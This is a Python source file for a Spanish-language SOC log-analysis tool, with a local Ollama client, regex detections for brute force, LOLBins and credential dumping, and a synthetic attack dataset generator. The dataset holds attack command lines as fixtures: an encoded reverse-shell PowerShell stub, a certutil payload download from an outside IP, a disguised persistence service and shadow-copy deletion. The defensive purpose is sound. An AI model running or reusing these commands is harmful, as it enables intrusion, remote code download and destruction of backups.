"""
# Tool: soc_log_agent.py

## Metadata
- Nombre: soc_log_agent.py
- Versión: 1.2
- Lenguaje: Python 3.11+
- Creada en proyecto: SOC_Agentico
- Fecha de creación: 31-10-2026
- Descripción: Motor de procesamiento heurístico de logs de SIEM (Excel/CSV), soporte para UploadedFile de Streamlit, extracción de IoCs, conector con LLM local en Ollama (llama3.2) y generador de reportes periciales en PDF (Ejecutivo y Técnico).
- Dependencias: pandas, openpyxl, requests, playwright
"""

import os
import sys
import json
import time
import subprocess
from datetime import datetime, timedelta
import random
from pathlib import Path
import pandas as pd
import requests

def _get_default_ollama_url():
    raw = os.environ.get("OLLAMA_HOST", "").strip()
    if not raw:
        return "http://127.0.0.1:1143"
    if not raw.startswith("http://") and not raw.startswith("https://"):
        raw = f"http://{raw}"
    # Si viene con 0.0.0.0, para requests locales usamos 127.0.0.1
    raw = raw.replace("://0.0.0.0", "://127.0.0.1")
    return raw.rstrip("/")

DEFAULT_OLLAMA_URL = _get_default_ollama_url()

class OllamaClient:
    def __init__(self, base_url=None, default_model="llama3.2:latest"):
        self.base_url = (base_url or DEFAULT_OLLAMA_URL).rstrip("/")
        self.default_model = default_model

    def start_service(self, timeout=8):
        """Levanta automáticamente el proceso de Ollama en segundo plano."""
        candidates = [
            r"C:\Users\Developer\AppData\Local\Programs\Ollama\ollama.exe",
            "ollama"
        ]
        started = False
        creationflags = 0x08000000 if sys.platform == "win32" else 0  # CREATE_NO_WINDOW
        for exe in candidates:
            try:
                subprocess.Popen(
                    [exe, "serve"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=creationflags
                )
                started = True
                break
            except Exception:
                continue

        if not started:
            return False, []

        start_t = time.time()
        while time.time() - start_t < timeout:
            time.sleep(1)
            ok, models = self.check_health(auto_start=False)
            if ok:
                return True, models
        return False, []

    def check_health(self, auto_start=True):
        candidates = [
            self.base_url,
            "http://127.0.0.1:1143",
            "http://127.0.0.1:11434",
            "http://localhost:1143",
            "http://localhost:11434",
        ]
        seen = set()
        for candidate in candidates:
            if candidate in seen:
                continue
            seen.add(candidate)
            try:
                r = requests.get(f"{candidate}/api/tags", timeout=1.5)
                if r.status_code == 200:
                    self.base_url = candidate
                    models = [m.get("name", "") for m in r.json().get("models", [])]
                    return True, models
            except Exception:
                continue

        if auto_start:
            return self.start_service()

        return False, []

    def chat_stream(self, prompt, system_prompt=None, model=None, temperature=0.2, timeout=300):
        target_model = model or self.default_model
        messages = []
        if system_prompt:
            messages.append({"role": "system", "content": system_prompt})
        messages.append({"role": "user", "content": prompt})

        payload = {
            "model": target_model,
            "messages": messages,
            "stream": True,
            "options": {"temperature": temperature}
        }
        try:
            r = requests.post(f"{self.base_url}/api/chat", json=payload, stream=True, timeout=(15, timeout))
            if r.status_code != 200:
                yield f"[Error Ollama {r.status_code}]: {r.text}"
                return
            for line in r.iter_lines():
                if line:
                    chunk = json.loads(line.decode("utf-8"))
                    content = chunk.get("message", {}).get("content", "")
                    if content:
                        yield content
        except Exception as e:
            yield f"\n\n[Excepción Ollama]: {str(e)}"

    def chat(self, prompt, system_prompt=None, model=None, temperature=0.2, timeout=300):
        target_model = model or self.default_model
        messages = []
        if system_prompt:
            messages.append({"role": "system", "content": system_prompt})
        messages.append({"role": "user", "content": prompt})

        payload = {
            "model": target_model,
            "messages": messages,
            "stream": False,
            "options": {"temperature": temperature}
        }
        try:
            r = requests.post(f"{self.base_url}/api/chat", json=payload, timeout=(15, timeout))
            if r.status_code == 200:
                return r.json().get("message", {}).get("content", "").strip()
            else:
                return f"[Error Ollama {r.status_code}]: {r.text}"
        except Exception as e:
            return f"[Excepción Ollama]: {str(e)}"


class SIEMLogAnalyzer:
    def __init__(self, file_source):
        if isinstance(file_source, pd.DataFrame):
            self.df = file_source.copy()
        elif hasattr(file_source, "read"):
            # Objeto de Streamlit UploadedFile o file-like object
            self.df = self._load_from_buffer(file_source)
        else:
            self.file_path = Path(file_source)
            self.df = self._load_file()
        self._normalize_columns()

    def _load_from_buffer(self, file_obj):
        name = getattr(file_obj, "name", "").lower()
        if name.endswith(".csv"):
            return pd.read_csv(file_obj)
        else:
            return pd.read_excel(file_obj)

    def _load_file(self):
        ext = self.file_path.suffix.lower()
        if ext in [".xlsx", ".xls"]:
            return pd.read_excel(self.file_path)
        elif ext == ".csv":
            return pd.read_csv(self.file_path)
        else:
            raise ValueError(f"Formato no soportado: {ext}. Utilice .xlsx o .csv")

    def _normalize_columns(self):
        col_map = {}
        for c in self.df.columns:
            cl = str(c).strip().lower().replace(" ", "_")
            if cl in ["timestamp", "time", "date", "datetime", "hora", "fecha"]:
                col_map[c] = "timestamp"
            elif cl in ["event_id", "eventid", "id_evento", "id"]:
                col_map[c] = "event_id"
            elif cl in ["user", "username", "target_user", "targetusername", "account", "usuario"]:
                col_map[c] = "user"
            elif cl in ["source_ip", "src_ip", "ip_origen", "client_ip", "ip"]:
                col_map[c] = "source_ip"
            elif cl in ["destination", "dest_ip", "dst_ip", "ip_destino", "server_ip"]:
                col_map[c] = "dest_ip"
            elif cl in ["hostname", "host", "computer", "equipo"]:
                col_map[c] = "hostname"
            elif cl in ["process_name", "process", "image", "imagen", "proceso"]:
                col_map[c] = "process_name"
            elif cl in ["process_commandline", "command_line", "commandline", "cmd", "comando", "arguments"]:
                col_map[c] = "command_line"
            elif cl in ["event_description", "message", "description", "descripcion", "details", "detalle"]:
                col_map[c] = "message"
            elif cl in ["severity", "severidad", "prioridad"]:
                col_map[c] = "log_severity"

        self.df = self.df.rename(columns=col_map)
        
        for req in ["timestamp", "event_id", "user", "source_ip", "dest_ip", "hostname", "process_name", "command_line", "message"]:
            if req not in self.df.columns:
                self.df[req] = ""

        try:
            self.df["timestamp"] = pd.to_datetime(self.df["timestamp"], errors="coerce")
        except Exception:
            pass

    def run_heuristic_analysis(self):
        anomalies = []
        df = self.df

        # 1. Fuerza Bruta / Password Spray (Event ID 4625)
        failed_logins = df[df["event_id"].astype(str).str.contains("4625|fail", case=False, na=False)]
        if not failed_logins.empty:
            # Agrupación por IP de origen
            ip_counts = failed_logins["source_ip"].value_counts()
            for ip, count in ip_counts.items():
                if str(ip).strip() and count >= 3:
                    targeted_users = [str(u) for u in failed_logins[failed_logins["source_ip"] == ip]["user"].unique() if str(u).strip() and str(u).lower() != "nan"]
                    is_spray = len(targeted_users) >= 3
                    anomalies.append({
                        "tipo": "Password Spraying" if is_spray else "Fuerza Bruta (Logon Failure)",
                        "severidad": "Crítico" if count > 8 or is_spray else "Alto",
                        "event_id": 4625,
                        "ip_origen": str(ip),
                        "usuarios_afectados": targeted_users[:8],
                        "total_intentos": int(count),
                        "mitre_id": "T1110.003" if is_spray else "T1110.001",
                        "mitre_name": "Password Spraying" if is_spray else "Password Guessing",
                        "descripcion": f"Se detectaron {count} intentos fallidos de autenticación desde la IP {ip} apuntando a {len(targeted_users)} cuenta(s) ({', '.join(targeted_users[:4])})."
                    })

        # 2. Creación de Tareas Programadas Sospechosas (Event ID 4698)
        task_events = df[df["event_id"].astype(str).str.contains("4698", case=False, na=False)]
        for _, row in task_events.iterrows():
            cmd = str(row["command_line"])
            user = str(row["user"])
            host = str(row["hostname"])
            anomalies.append({
                "tipo": "Persistencia: Creación de Tarea Programada",
                "severidad": "Crítico",
                "event_id": 4698,
                "ip_origen": str(row["source_ip"]) or host,
                "usuarios_afectados": [user],
                "total_intentos": 1,
                "mitre_id": "T1053.005",
                "mitre_name": "Scheduled Task/Job: Scheduled Task",
                "comando": cmd,
                "descripcion": f"En el host {host}, el usuario {user} creó la tarea programada: '{cmd}'."
            })

        # 3. Comandos sospechosos / Living off the Land (Event ID 4688 / Sysmon 1)
        cmd_patterns = [
            (r"-enc|-encodedcommand|frombase64string", "PowerShell con comando codificado en Base64", "Crítico", "T1059.001"),
            (r"tar\.exe.*-c.*-f|zip.*-r|rar.*a", "Empaquetado y Staging de archivos (Exfiltración)", "Alto", "T1560.001"),
            (r"net\.exe\s+view|nltest|net\s+group", "Reconocimiento de red y recursos compartidos (Discovery)", "Alto", "T1018"),
            (r"downloadstring|iwr|curl|wget|certutil.*-urlcache", "Descarga remota de payload (C2 Download)", "Crítico", "T1105"),
            (r"vssadmin.*delete.*shadows|wmic.*shadowcopy.*delete", "Destrucción de copias de seguridad (Ransomware)", "Crítico", "T1490"),
            (r"whoami.*/priv", "Reconocimiento de privilegios locales", "Medio", "T1087.002"),
            (r"mimikatz|sekurlsa|procdump.*lsass", "Volcado de credenciales en memoria (LSASS)", "Crítico", "T1003.001"),
            (r"net.*user.*/add|net.*localgroup.*administrators.*/add", "Creación de usuario local con privilegios", "Alto", "T1136.001"),
        ]

        cmd_df = df[df["command_line"].astype(str).str.strip().replace("nan", "") != ""]
        for _, row in cmd_df.iterrows():
            cmd = str(row["command_line"])
            user = str(row["user"])
            host = str(row["hostname"])
            for pattern, desc, sev, mitre in cmd_patterns:
                if pd.Series(cmd).str.contains(pattern, case=False, regex=True).iloc[0]:
                    anomalies.append({
                        "tipo": "Ejecución de Comando Sospechoso",
                        "severidad": sev,
                        "event_id": row["event_id"] or 4688,
                        "ip_origen": str(row["source_ip"]) or host,
                        "usuarios_afectados": [user],
                        "total_intentos": 1,
                        "mitre_id": mitre,
                        "mitre_name": desc,
                        "comando": cmd,
                        "descripcion": f"En {host}, usuario {user} ejecutó: '{cmd}'"
                    })
                    break

        # 4. Privilegios especiales (Event ID 4672) - Agrupado por cuenta
        priv_events = df[df["event_id"].astype(str).str.contains("4672", case=False, na=False)]
        if not priv_events.empty:
            priv_users = priv_events["user"].value_counts()
            for u, count in priv_users.items():
                user_str = str(u).strip()
                if user_str and user_str.lower() not in ["system", "local service", "network service", "nan"]:
                    anomalies.append({
                        "tipo": "Asignación de Privilegios Administrativos Especiales",
                        "severidad": "Medio",
                        "event_id": 4672,
                        "ip_origen": "Host Local / DC",
                        "usuarios_afectados": [user_str],
                        "total_intentos": int(count),
                        "mitre_id": "T1078.002",
                        "mitre_name": "Valid Accounts: Domain Accounts",
                        "descripcion": f"La cuenta {user_str} registró {count} asignaciones de privilegios de seguridad especiales."
                    })

        # 5. Nuevo Servicio Instalado (Event ID 7045)
        srv_events = df[df["event_id"].astype(str).str.contains("7045", case=False, na=False)]
        for _, row in srv_events.iterrows():
            msg = str(row["message"]) + " " + str(row["command_line"])
            anomalies.append({
                "tipo": "Nuevo Servicio del Sistema Creado (Persistencia)",
                "severidad": "Alto",
                "event_id": 7045,
                "ip_origen": str(row["source_ip"]) or str(row["hostname"]),
                "usuarios_afectados": [str(row["user"])],
                "total_intentos": 1,
                "mitre_id": "T1543.003",
                "mitre_name": "Create or Modify System Process: Windows Service",
                "descripcion": f"Instalación de servicio persistente: {msg[:100]}"
            })

        return anomalies


def generate_sample_siem_dataset(output_path="dataset_siem_muestra.xlsx", total_rows=2500):
    random.seed(42)
    start_time = datetime(2026, 10, 25, 8, 0, 0)
    users = ["jsmith", "mrossi", "agarcia", "ladmin", "dgarcia", "svc_backup", "coperador", "tlead_carlos"]
    internal_ips = [f"192.168.10.{i}" for i in range(10, 60)]
    normal_processes = [
        ("explorer.exe", "C:\\Windows\\explorer.exe"),
        ("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""),
        ("outlook.exe", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""),
        ("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p")
    ]

    records = []
    current_time = start_time

    for _ in range(int(total_rows * 0.8)):
        current_time += timedelta(seconds=random.randint(2, 45))
        u = random.choice(users)
        ip = random.choice(internal_ips)
        p_name, p_cmd = random.choice(normal_processes)
        ev_id = random.choice([4624, 1, 4624, 1, 4672])
        records.append({
            "timestamp": current_time.strftime("%Y-%m-%d %H:%M:%S"),
            "event_id": ev_id,
            "user": u,
            "source_ip": ip,
            "dest_ip": "192.168.10.5",
            "process_name": p_name,
            "command_line": p_cmd,
            "message": f"Actividad normal de sistema para {u}."
        })

    attack_time = datetime(2026, 10, 25, 23, 15, 0)
    attacker_ip = "45.142.166.112"
    for target in users:
        for _ in range(3):
            attack_time += timedelta(seconds=random.randint(1, 4))
            records.append({
                "timestamp": attack_time.strftime("%Y-%m-%d %H:%M:%S"),
                "event_id": 4625,
                "user": target,
                "source_ip": attacker_ip,
                "dest_ip": "192.168.10.5",
                "process_name": "lsass.exe",
                "command_line": "",
                "message": f"Fallo de autenticación (0xC000006A) en cuenta {target}."
            })
    
    attack_time += timedelta(seconds=10)
    compromised_user = "svc_backup"
    records.append({
        "timestamp": attack_time.strftime("%Y-%m-%d %H:%M:%S"),
        "event_id": 4624,
        "user": compromised_user,
        "source_ip": attacker_ip,
        "dest_ip": "192.168.10.5",
        "process_name": "lsass.exe",
        "command_line": "",
        "message": f"Inicio de sesión exitoso por RDP (Logon Type 10) en {compromised_user}."
    })

    commands = [
        ("powershell.exe", "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAiACwANAA0ADQANAApAA==", "Sysmon 1"),
        ("cmd.exe", "cmd.exe /c whoami /priv && net group \"Domain Admins\" /domain", "Sysmon 1"),
        ("certutil.exe", "certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\\Users\\Public\\payload.exe", "Sysmon 1"),
        ("services.exe", "C:\\Windows\\system32\\sc.exe create WindowsUpdateSvc binPath= \"C:\\Users\\Public\\payload.exe\" start= auto", "7045"),
        ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "Sysmon 1")
    ]

    for p_name, cmd, ev in commands:
        attack_time += timedelta(seconds=random.randint(15, 60))
        records.append({
            "timestamp": attack_time.strftime("%Y-%m-%d %H:%M:%S"),
            "event_id": 1 if "Sysmon" in ev else 7045,
            "user": compromised_user,
            "source_ip": attacker_ip,
            "dest_ip": "192.168.10.25",
            "process_name": p_name,
            "command_line": cmd,
            "message": f"Ejecución sospechosa detectada: {p_name}"
        })

    df_sample = pd.DataFrame(records)
    df_sample["timestamp"] = pd.to_datetime(df_sample["timestamp"])
    df_sample = df_sample.sort_values(by="timestamp").reset_index(drop=True)

    output_p = Path(output_path)
    output_p.parent.mkdir(parents=True, exist_ok=True)
    df_sample.to_excel(output_p, index=False)
    return output_p, len(df_sample)
